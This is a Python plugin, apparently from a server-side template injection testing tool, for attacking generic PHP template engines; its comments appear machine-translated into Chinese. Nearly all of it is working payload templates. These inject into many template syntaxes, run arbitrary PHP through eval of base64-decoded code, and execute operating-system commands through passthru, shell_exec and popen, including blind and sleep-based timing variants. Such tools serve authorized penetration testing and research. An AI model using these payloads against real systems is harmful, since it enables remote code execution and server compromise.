from plugins.languages import php
from utils import rand
from core import bash


class Php_generic(php.Php):
    priority = 9
    plugin_info = {
        "Description": '标签中带有 PHP 语句评估的模板引擎',
        "Usage notes": '该插件可用于加速简单上下文中的检测以及覆盖更多此类引擎。',
        "Authors": [
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                # TODO：稍后添加 pre_header：ini_set("error_reporting", "0")
                'header': '{header[0]}+{header[1]}',
                'trailer': '{trailer[0]}+{trailer[1]}',
                'test_render': f'"{rand.randints[0]}"+"{rand.randints[1]}"',
                'test_render_expected': f'{rand.randints[0]+rand.randints[1]}'
            },
            'render_error': {
                # 只需使用包装好的载荷进行评估，但不带 ;到底
                'wrapper_type': "global",
                'trailer': """)),strval({trailer[0]}+{trailer[1]})]))""",
            },
            'evaluate': {
                # 来自 Twig 的肮脏黑客攻击
                'call': 'execute',
                'evaluate': """php -r '$d="{code_b64}";eval(base64_decode(str_pad(strtr($d,"-_","+/"),strlen($d)%4,"=",STR_PAD_RIGHT)));'""",
                'test_os': 'echo PHP_OS;',
                'test_os_expected': r'^[\w-]+$'
            },
            'evaluate_boolean': {
                # 来自 Twig 的肮脏黑客攻击
                'call': 'execute_blind',
                'evaluate_blind': """php -r '$d="{code_b64}";1 / (true && eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%4,"=",STR_PAD_RIGHT)) . ");"));'""",
            },
            'evaluate_blind': {
                # 来自 Twig 的肮脏黑客攻击
                'call': 'execute_blind',
                'evaluate_blind': """php -r '$d="{code_b64}";eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%4,"=",STR_PAD_RIGHT)) . ") && sleep({delay});");'""",
            },
            'execute': {
                'call': 'render',
                # 使用 passthru 避免双输出
                'execute': """passthru(base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT)))""",
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2]
            },
            'execute_error': {
                # 使用 shell_exec 获取完整输出
                'execute': """shell_exec(base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT)))"""
            },
            'execute_boolean': {
                'call': 'inject',
                'execute_blind': """1 / (pclose(popen(base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT)), "wb")) == 0)"""
            },
            'execute_blind': {
                'call': 'inject',
                # 使用 passthru 避免双输出
                'execute_blind': """passthru(join("", [base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT))," && sleep {delay}"]))"""
            },
        })

        self.set_contexts([
            # 文本上下文，无闭包
            {'level': 0, 'wrappers': ["{{{code}}}", "{{{{{code}}}}}", "${{{code}}}", "<%={code}%>",
                                      "#{{{code}}}", "{{={code}}}", "{{{{={code}}}}}", "\n={code}\n"]},
            {'level': 2, 'prefix': '{closure}}}', 'wrappers': ["{{{code}}}"], 'suffix': '{"1"', 'closures': php.ctx_closures},
            {'level': 2, 'prefix': '{closure}}}}}', 'wrappers': ["{{{{{code}}}}}"], 'suffix': '{{"1"', 'closures': php.ctx_closures},
            {'level': 2, 'prefix': '{closure}}}', 'wrappers': ["${{{code}}}"], 'suffix': '${"1"', 'closures': php.ctx_closures},
            {'level': 2, 'prefix': '{closure}%>', 'wrappers': ["<%={code}%>"], 'suffix': '<%="1"', 'closures': php.ctx_closures},
            {'level': 3, 'prefix': '{closure}}}', 'wrappers': ["#{{{code}}}"], 'suffix': '#{"1"', 'closures': php.ctx_closures},
            {'level': 3, 'prefix': '{closure}}}', 'wrappers': ["{{={code}}}"], 'suffix': '{="1"', 'closures': php.ctx_closures},
            {'level': 3, 'prefix': '{closure}}}}}', 'wrappers': ["{{{{={code}}}}}"], 'suffix': '{{="1"', 'closures': php.ctx_closures},
            {'level': 3, 'prefix': '{closure}\n', 'wrappers': ["\n={code}\n"], 'suffix': '\n="1"', 'closures': php.ctx_closures},
            {'level': 3, 'prefix': '{closure}%}}', 'wrappers': ["{{{code}}}", "{{{{{code}}}}}",
                                                                "{{={code}}}", "{{{{={code}}}}}"], 'suffix': '{%"1"', 'closures': php.ctx_closures},
            # Comments
            {'level': 4, 'prefix': '*}}', 'wrappers': ["{{{code}}}", "{{{{{code}}}}}", "${{{code}}}",
                                                       "#{{{code}}}", "{{={code}}}", "{{{{={code}}}}}"], 'suffix': '{*'},
            {'level': 4, 'prefix': '#}}', 'wrappers': ["{{{code}}}", "{{{{{code}}}}}", "${{{code}}}",
                                                       "#{{{code}}}", "{{={code}}}", "{{{{={code}}}}}"], 'suffix': '{#'},
        ])
